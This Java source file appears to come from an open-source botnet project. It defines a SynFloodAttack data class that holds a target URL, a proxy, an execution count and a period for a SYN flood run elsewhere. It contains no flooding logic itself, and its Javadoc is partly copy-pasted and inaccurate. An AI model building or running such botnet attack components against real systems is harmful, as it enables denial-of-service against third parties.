/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack;

import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NonNull;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.net.URL;

/**
 * The details of a HTTP attack. Used by {@link SynFloodAttacker} to perform the attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
@Data
@AllArgsConstructor
public class SynFloodAttack implements Attack {

  protected static final Logger LOGGER = LogManager.getLogger(SynFloodAttack.class);

  /**
   * The target to attack.
   */
  @NonNull
  private URL target;

  /**
   * The proxy to attack through.
   */
  private HttpProxy proxy = HttpProxy.NONE;

  /**
   * The maximum number of attack executions.
   * Default is 1.
   */
  private int executions = 1;

  /**
   * The execution period.
   */
  private Interval period = null;

  /**
   * Constructs a new attack with no proxy, empty properties and one execution.
   * @param target the target to attack.
   */
  public SynFloodAttack(URL target) {
    this(target, HttpProxy.NONE, 1, null);
  }

  /**
   * Constructs a new attack with no proxy, empty properties and one execution.
   * @param target the target to attack.
   * @param proxy the proxy to attack through.
   */
  public SynFloodAttack(URL target, HttpProxy proxy) {
    this(target, proxy, 1, null);
  }

  /**
   * Constructs a new attack with no proxy, empty properties and one execution.
   * @param target the target to attack.
   * @param executions the number of executions.
   * @param period the period of executions.
   */
  public SynFloodAttack(URL target, int executions, Interval period) {
    this(target, HttpProxy.NONE, executions, period);
  }
}
